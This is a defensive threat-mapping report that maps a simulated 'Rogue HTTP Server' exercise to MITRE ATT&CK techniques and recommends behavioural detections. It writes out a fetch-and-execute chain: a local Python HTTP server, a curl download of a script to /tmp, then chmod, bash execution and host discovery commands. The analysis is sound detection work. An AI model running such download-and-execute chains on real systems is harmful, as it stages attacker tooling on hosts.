# Threat Mapping Report: Rogue HTTP Server (T1105 – Ingress Tool Transfer)

## Overview

This report maps the behaviors observed during the Rogue HTTP Server simulation to known adversary techniques documented in the MITRE ATT&CK framework.

The objective of this phase is to determine whether the observed telemetry and behavioral findings resemble known attacker tradecraft and to identify ATT&CK techniques that accurately characterize the activity.

Unlike the telemetry analysis phase, which focuses on what occurred, and the investigation phase, which focuses on why the behavior is suspicious, the threat mapping phase focuses on answering:

* Does the observed activity resemble known adversary behavior?
* Which ATT&CK techniques are represented?
* How would a threat actor realistically use these behaviors?
* Why should the observed activity be considered a potential threat?

---

# Simulation Summary

The observed attack sequence consisted of:

```text id="d1f8k3"
python3 -m http.server 8000
        ↓
curl http://127.0.0.1:8000/updater.sh
        ↓
/tmp/updater.sh created
        ↓
chmod +x /tmp/updater.sh
        ↓
/bin/bash /tmp/updater.sh
        ↓
whoami
id
hostname
```

The sequence represents a complete post-compromise workflow involving tool staging, transfer, execution, and host discovery.

---

# ATT&CK Mapping Overview

| Observed Behavior                       | ATT&CK Technique                     | Tactic              |
| --------------------------------------- | ------------------------------------ | ------------------- |
| Python HTTP server used to host payload | T1105 - Ingress Tool Transfer        | Command and Control |
| Payload download via curl               | T1105 - Ingress Tool Transfer        | Command and Control |
| Execution of downloaded script          | T1059.004 - Unix Shell               | Execution           |
| whoami execution                        | T1033 - System Owner/User Discovery  | Discovery           |
| id execution                            | T1033 - System Owner/User Discovery  | Discovery           |
| hostname execution                      | T1082 - System Information Discovery | Discovery           |

---

# Primary Technique Mapping

## T1105 - Ingress Tool Transfer

### Observed Behavior

```bash id="f0l7vw"
python3 -m http.server 8000

curl http://127.0.0.1:8000/updater.sh \
-o /tmp/updater.sh
```

### ATT&CK Description

Ingress Tool Transfer involves transferring tools, malware, scripts, or utilities from an attacker-controlled location onto a compromised system.

Threat actors frequently deploy additional payloads after obtaining access rather than delivering all tooling during initial compromise.

### Comparison to Observed Activity

| ATT&CK Behavior             | Simulation Behavior              |
| --------------------------- | -------------------------------- |
| Adversary hosts tooling     | Python HTTP server hosts payload |
| Adversary transfers tooling | curl retrieves payload           |
| Tool staged on victim       | Payload stored in /tmp           |
| Tool prepared for use       | chmod modifies permissions       |
| Tool executed               | updater.sh executed              |

### Threat Assessment

The observed activity closely matches ATT&CK's description of Ingress Tool Transfer.

The behavior is particularly significant because it demonstrates attacker-controlled tooling entering the environment after compromise.

### Mapping Confidence

```text id="d2a8x4"
Confidence: High
```

---

# Secondary Technique Mapping

## T1059.004 - Unix Shell

### Observed Behavior

```bash id="b8lq91"
/bin/bash /tmp/updater.sh
```

### ATT&CK Description

Adversaries commonly abuse native shell interpreters to execute commands, scripts, and payloads.

Shell execution remains one of the most prevalent execution mechanisms on Linux systems.

### Comparison to Observed Activity

The transferred payload was executed through Bash.

The shell interpreter acted as the execution mechanism for attacker-controlled content.

### Threat Assessment

Execution through Bash is highly representative of Linux intrusions, malware deployment, and post-exploitation activity.

### Mapping Confidence

```text id="s5n3tp"
Confidence: High
```

---

# Discovery Technique Mapping

## T1033 - System Owner/User Discovery

### Observed Behavior

```bash id="v7xg2e"
whoami

id
```

### ATT&CK Description

Threat actors often determine the current user context and privilege level immediately after obtaining execution on a system.

This information assists with privilege escalation decisions and operational planning.

### Comparison to Observed Activity

The payload queried:

* Current user
* User identifier
* Group memberships
* Privilege context

### Threat Assessment

The commands directly align with ATT&CK's definition of user and ownership discovery.

### Mapping Confidence

```text id="g0w2nf"
Confidence: High
```

---

## T1082 - System Information Discovery

### Observed Behavior

```bash id="kp6b7q"
hostname
```

### ATT&CK Description

Threat actors collect host information to understand the environment and identify targets of interest.

Hostnames frequently provide clues regarding:

* Server roles
* Organizational naming schemes
* Critical infrastructure assets

### Comparison to Observed Activity

The payload collected host identity information.

### Threat Assessment

The behavior directly matches ATT&CK system information discovery objectives.

### Mapping Confidence

```text id="x8u5hd"
Confidence: High
```

---

# Tactic Progression Analysis

The simulation demonstrates multiple ATT&CK tactics occurring in sequence.

## Execution

```text id="w2n8m4"
T1059.004
Unix Shell
```

Observed during:

```text id="u4h7t9"
/bin/bash /tmp/updater.sh
```

---

## Command and Control

```text id="k3y6vp"
T1105
Ingress Tool Transfer
```

Observed during:

```text id="q6r1zd"
HTTP staging
payload download
```

---

## Discovery

```text id="c5n4xa"
T1033
T1082
```

Observed during:

```text id="n7f0pe"
whoami
id
hostname
```

---

# Threat Legitimization Analysis

A critical question during threat mapping is whether the observed activity could reasonably occur during normal administration.

## Individual Activities

When viewed independently:

| Activity              | Potentially Legitimate |
| --------------------- | ---------------------- |
| Python HTTP server    | Yes                    |
| curl download         | Yes                    |
| chmod +x              | Yes                    |
| Bash script execution | Yes                    |
| whoami                | Yes                    |
| hostname              | Yes                    |

No individual event is inherently malicious.

---

## Correlated Activity

When correlated:

```text id="a8v3rc"
Temporary HTTP Server
        ↓
Payload Download
        ↓
Payload Written To /tmp
        ↓
Permission Modification
        ↓
Execution
        ↓
Discovery Activity
```

The sequence becomes substantially more suspicious.

### Why?

Because the behavior demonstrates intent.

The activity is not a collection of unrelated administrative actions.

Each action contributes to a coherent objective:

```text id="t2n5yu"
Transfer Tool
        ↓
Prepare Tool
        ↓
Execute Tool
        ↓
Gather Information
```

This mirrors common attacker workflows documented across numerous Linux intrusions.

---

# Real-World Threat Scenarios

The observed behavior is consistent with:

## Post-Exploitation Tool Delivery

```text id="z9m1xf"
Compromise
        ↓
Transfer Utility
        ↓
Execute Utility
```

Examples:

* Remote administration tooling
* Credential harvesters
* Persistence mechanisms
* Reconnaissance scripts

---

## Malware Staging

```text id="g4y7oe"
Dropper
        ↓
Download Payload
        ↓
Execute Payload
```

Examples:

* Botnet installation
* Cryptominer deployment
* Backdoor delivery

---

## Interactive Adversary Operations

```text id="d7u3pi"
Operator Access
        ↓
Tool Transfer
        ↓
Reconnaissance
```

Examples:

* Red team operations
* Hands-on-keyboard intrusions
* Lateral movement preparation

---

# Threat Mapping Findings

## Finding 1

### Tool Transfer Behavior Observed

Mapped Technique:

```text id="m5k8wq"
T1105
Ingress Tool Transfer
```

Confidence:

```text id="j1v4ea"
High
```

---

## Finding 2

### Downloaded Tool Executed Through Shell

Mapped Technique:

```text id="n2c7hz"
T1059.004
Unix Shell
```

Confidence:

```text id="r8x6gb"
High
```

---

## Finding 3

### User Context Discovery

Mapped Technique:

```text id="y0d5kr"
T1033
System Owner/User Discovery
```

Confidence:

```text id="u3p8mf"
High
```

---

## Finding 4

### Host Information Discovery

Mapped Technique:

```text id="v6t2ln"
T1082
System Information Discovery
```

Confidence:

```text id="p4s9cd"
High
```

---

# Detection Engineering Implications

The threat mapping exercise confirms that the simulation produced behavior that closely aligns with documented ATT&CK techniques.

The strongest ATT&CK-aligned behavioral chain identified is:

```text id="h8r1wy"
T1105
        ↓
T1059.004
        ↓
T1033
        ↓
T1082
```

This progression demonstrates a realistic attacker workflow and provides a strong foundation for detection development.

Rather than detecting isolated commands, detection logic should prioritize identifying the behavioral chain that connects tool transfer, payload execution, and discovery activity.

---

# Conclusion

The observed Rogue HTTP Server simulation exhibits strong alignment with established adversary tradecraft documented within the MITRE ATT&CK framework.

The activity demonstrates a realistic post-compromise workflow in which an attacker stages tooling through a temporary HTTP service, transfers the tool onto a compromised host, executes the transferred payload through a shell interpreter, and performs basic host discovery.

The mapped ATT&CK techniques validate that the observed behavior represents a credible attack scenario and justify the development of behavioral detections targeting ingress tool transfer and subsequent execution activity.
